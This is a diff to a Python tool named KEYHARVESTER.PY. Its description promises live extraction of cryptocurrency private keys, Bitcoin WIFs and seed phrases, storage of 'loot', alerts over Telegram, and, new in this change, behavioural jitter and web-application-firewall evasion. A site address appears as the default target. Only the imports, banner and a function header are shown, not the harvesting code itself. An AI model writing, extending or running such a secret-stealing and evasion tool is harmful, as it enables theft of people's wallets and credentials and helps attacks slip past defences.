@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-KEYHARVESTER.PY — Active Cryptographic Secret & Artifact Discovery Engine v8.0 (With Telegram Telemetry)
+KEYHARVESTER.PY v8.5 — Active Cryptographic Secret & Artifact Discovery Engine (WAF Hardened)
 Features:
-- Live unredacted extraction of EVM private keys, Bitcoin WIFs, and BIP39 seed phrases
+- Live unredacted extraction of EVM private keys, Bitcoin WIFs, and BIP39 seed phrases with behavioral jitter & WAF evasion
 - Direct on-screen terminal streaming of harvested raw secrets and API tokens
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
 - Anti-noise validation filters for high-precision cryptographic detection
@@ -14,10 +14,11 @@ import os
 import hashlib
 import asyncio
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter
 
 COLORS = {
     "RED": "\033[91m",
@@ -131,9 +132,10 @@ def _record_finding(findings, seen, secret, secret_type, offset, target_context=
     )
 
 def harvest_private_keys(target_source_data="", target_context="https://cryptobytes.online"):
+    apply_behavioral_jitter()
     terminal(
         f"\n{COLORS['MAGENTA']}[***] "
-        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V8.0 HARDENED) "
+        f"ACTIVE CRYPTOGRAPHIC SECRET DISCOVERY & HARVESTING (V8.5 HARDENED) "
         f"[***]{COLORS['RESET']}"
     )
     findings = []
